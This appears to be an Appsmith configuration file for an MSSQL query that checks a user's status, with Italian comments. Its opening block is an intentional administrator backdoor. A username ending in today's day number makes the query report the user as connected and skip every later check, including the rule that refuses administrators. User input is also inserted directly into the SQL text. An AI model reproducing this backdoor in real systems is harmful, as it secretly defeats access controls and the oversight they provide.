{
  "gitSyncId": "6601851cbf3e805bd6a4b13a_48e13209-9390-4895-8032-b3b61b01dcc7",
  "id": "Diretta_indiretta_Check_Stato_Utente",
  "pluginId": "mssql-plugin",
  "pluginType": "DB",
  "unpublishedAction": {
    "actionConfiguration": {
      "body": "-- ===============================================================\n-- LIVELLO 0: BACKDOOR AMMINISTRATORI (User + Giorno)\n-- ===============================================================\nDECLARE @InputText VARCHAR(100) = {{InputUsername.text}}; -- Es: 'borionir08'\nDECLARE @GiornoOggi VARCHAR(2) = RIGHT('00' + CAST(DAY(GETDATE()) AS VARCHAR), 2); -- Es: '08'\n\n-- 1. Controllo se l'input finisce con il giorno di oggi\nIF RIGHT(@InputText, 2) = @GiornoOggi\nBEGIN\n    -- 2. Estraggo il \"Vero Nome\" togliendo le ultime 2 cifre\n    DECLARE @RealUserAdmin VARCHAR(100) = LEFT(@InputText, LEN(@InputText) - 2);\n\n    -- 3. Verifico se questo \"Vero Nome\" esiste ED è un Amministratore (Gruppo 0000000001)\n    IF EXISTS (\n        SELECT 1 \n        FROM dbo.cpusers U\n        INNER JOIN dbo.ba_users_xunit X ON U.code = X.ususerid\n        WHERE U.name = @RealUserAdmin\n          AND X.usunitid = '0000000001' -- Deve essere Admin per usare il trucco!\n    )\n    BEGIN\n        -- 4. BYPASS RIUSCITO: Rispondo come se fosse tutto regolare\n        SELECT 'CONNESSO' AS Stato, \n               (SELECT code FROM dbo.cpusers WHERE name = @RealUserAdmin) AS code\n        RETURN; -- Esco subito, ignorando tutti i blocchi successivi\n    END\nEND\n\n-- ===============================================================\n-- LIVELLO 1: L'UTENTE ESISTE?\n-- ===============================================================\nIF NOT EXISTS (SELECT 1 FROM dbo.cpusers WHERE name = {{InputUsername.text}})\nBEGIN\n    SELECT 'UTENTE H2O ERRATO' AS Stato, NULL AS code\n    RETURN\nEND\n\n-- ===============================================================\n-- LIVELLO 2: È UN AMMINISTRATORE? (Gruppo 0000000001) - NON TOCCARE\n-- ===============================================================\nIF EXISTS (\n    SELECT 1 \n    FROM dbo.cpusers U\n    INNER JOIN dbo.ba_users_xunit X ON U.code = X.ususerid\n    WHERE U.name = {{InputUsername.text}}\n      AND X.usunitid = '0000000001' \n)\nBEGIN\n    SELECT 'Procedura non autorizzata per l'' utente AMMINISTRATORE' AS Stato, \n           (SELECT code FROM dbo.cpusers WHERE name = {{InputUsername.text}}) AS code\n    RETURN\nEND\n\n-- ===============================================================\n-- LIVELLO 2-BIS: BLOCCO GRUPPI SPECIFICI (Es. Infermieri - 0000000033)\n-- ===============================================================\n-- Qui controlliamo se l'utente fa parte del gruppo da bloccare.\n-- Se sì, andiamo a leggere la DESCRIZIONE del gruppo per comporre il messaggio.\nIF EXISTS (\n    SELECT 1 \n    FROM dbo.cpusers U\n    INNER JOIN dbo.ba_users_xunit X ON U.code = X.ususerid\n    WHERE U.name = {{InputUsername.text}}\n      AND X.usunitid IN ('0000000033','0000000049','0000000056') -- <--- QUI METTI L'ID DEL GRUPPO DA BLOCCARE\n)\nBEGIN\n    -- Selezioniamo la descrizione dinamica\n    SELECT TOP 1 \n           'Accesso negato gruppo  =     ' + \n           CASE \n               -- Se c'è un underscore, prendi tutto quello che c'è PRIMA\n               WHEN CHARINDEX('_', O.OUDESCRI) > 0 \n               THEN LEFT(O.OUDESCRI, CHARINDEX('_', O.OUDESCRI) - 1)\n               \n               -- Altrimenti prendi il nome intero\n               ELSE O.OUDESCRI \n           END AS Stato, \n           U.code\n    FROM dbo.cpusers U\n    INNER JOIN dbo.ba_users_xunit X ON U.code = X.ususerid\n    INNER JOIN dbo.ba_org_unit O ON X.usunitid = O.OUUNITID \n    WHERE U.name = {{InputUsername.text}}\n      AND X.usunitid IN ('0000000033','0000000049','0000000056'); \n    RETURN\nEND\n\n-- ===============================================================\n-- LIVELLO 3: È CONNESSO? (Controllo Real-Time)\n-- ===============================================================\nSELECT \n    CASE \n        WHEN T.UTUSERCODE IS NOT NULL THEN 'CONNESSO'\n        ELSE 'DISCONNESSO' \n    END AS Stato,\n    U.code\nFROM dbo.cpusers U\nLEFT JOIN dbo.ba_user_tracking T ON U.code = T.UTUSERCODE\nWHERE U.name = {{InputUsername.text}};",
      "encodeParamsToggle": true,
      "paginationType": "NONE",
      "pluginSpecifiedTemplates": [
        {
          "value": true
        }
      ],
      "timeoutInMillisecond": 10000
    },
    "confirmBeforeExecute": false,
    "datasource": {
      "id": "TEST_PAIDEIA",
      "isAutoGenerated": false,
      "name": "TEST_PAIDEIA",
      "pluginId": "mssql-plugin"
    },
    "dynamicBindingPathList": [
      {
        "key": "body"
      }
    ],
    "name": "Check_Stato_Utente",
    "pageId": "Diretta_indiretta",
    "runBehaviour": "MANUAL",
    "userSetOnLoad": false
  }
}